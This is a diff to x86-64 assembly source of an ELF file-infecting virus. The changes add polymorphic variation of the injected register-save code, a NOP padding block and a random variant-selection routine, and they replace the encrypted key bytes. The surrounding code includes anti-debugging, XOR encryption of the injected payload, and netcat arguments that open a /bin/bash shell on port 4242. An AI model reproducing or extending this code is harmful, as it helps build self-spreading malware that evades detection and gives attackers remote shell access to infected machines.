@@ -9,7 +9,9 @@ _start:
 
 begin:
 	; save all registers
+POLY_push_regs_begin:
 	push rax
+POLY_push_regs_end:
 	push rdi
 	push rsi
 	push rdx
@@ -169,6 +171,41 @@ can_run_infection:
 	cmp rax, 1					; if (_ret == 1)
 	je .process					; 	goto .process;
 %endif
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
 .end_anti_debugging:
 
 
@@ -511,11 +548,14 @@ nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
-magic_key: db 0xf0, 0xe8, 0x3d, 0xfd, 0x03, 0xbf, 0x00, 0x48, 0x8b, 0x35, 0x24, 0x32, 0xf6, 0x48, 0x79, 0x5f
-db 0x1a, 0xcc, 0xb6, 0x7c, 0x07, 0x48, 0xf7, 0x6a, 0xfa, 0x7d, 0xff, 0xff, 0xe8, 0xc3, 0x7d, 0x07
-db 0xfe, 0x9f, 0x40
+magic_key: db 0xd8, 0x1d, 0xad, 0x9f, 0x94, 0x90, 0x90, 0xd8, 0x1b, 0xa5, 0xfc, 0x93, 0x90, 0x90, 0xd8, 0x1d
+db 0x85, 0x78, 0x6e, 0x6f, 0x6f, 0xd8, 0x1b, 0x9d, 0xa1, 0x6f, 0x6f, 0x6f, 0x78, 0x3a, 0x6e, 0x6f
+db 0x6f, 0x7b, 0xbc
 magic_key_size: equ $ - magic_key
 fingerprint_int: dd 0
+poly_push_regs_buffer: db 0x50, 0x50
+poly_push_regs_size: dq 1
+poly_push_regs_count: dq 2
 ; END FAKE .data SECTION
 
 ; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
@@ -988,6 +1028,20 @@ treat_file:
 	add rdi, key_size - _start			; 	+ (key_size - _start)
 	mov qword [rdi], KEY_BYTE_SIZE			; *_key_size_ptr = KEY_BYTE_SIZE;
 
+	; replace injected push_regs by a random poly_push_regs
+	mov rdi, [rand_buffer]				; variation_ptr = get_variation_ptr(rand_buffer, rand_index, poly_push_regs_count, poly_push_regs_size, poly_push_regs_buffer);
+	mov rsi, [rand_index]				; ...
+	mov rdx, [poly_push_regs_count]			; ...
+	mov rcx, [poly_push_regs_size]			; ...
+	lea r8, [poly_push_regs_buffer]			; ...
+	call get_variation_ptr				; ...
+	mov rsi, rax					; ...
+	mov rdi, [mappedfile]				; _poly_push_regs_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, POLY_push_regs_begin - _start		; 	+ (.POLY_push_regs_begin - _start)
+	mov rcx, [rel poly_push_regs_size]		; _poly_push_regs_size = poly_push_regs_size;
+	rep movsb					; memcpy(_poly_push_regs_ptr, variation_ptr, _poly_push_regs_size);
+
 	; xor cipher all injected bytes between infection_routine and _end
 	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _start);
 	add rdi, [filesize]				;
@@ -1026,6 +1080,26 @@ treat_file:
 	add rsp, %$localsize
 	pop rbp
 	%pop
+	ret
+
+; unsignec char *get_variation_ptr(unsigned int *rand_buffer, long *rand_index, unsigned int variation_count, unsigned int variation_size, unsigned char *variation_ptr);
+; rax get_variation_ptr(rdi rand_buffer, rsi rand_index, rdx variation_count, rcx variation_size, r8 variation_ptr);
+get_variation_ptr:
+	push r8
+	push rcx
+	push rdx
+	call rand					; rand_val = rand(rand_buffer, rand_index);
+
+	xor rdx, rdx					; rand_index (rdx) = rand_val % variation_count
+	pop rdi						; ...
+	div rdi						; ...
+
+	pop rdi						; rand_pos = rand_index * variation_size
+	imul rdx, rdi					; ...
+	
+	pop rsi						; _variation_ptr = variation_ptr
+	add rsi, rdx					; _variation_ptr += rand_pos
+	mov rax, rsi					; return _variation_ptr
 	ret
 
 ; Elf64_Addr get_next_available_vaddr(char const *file_map);
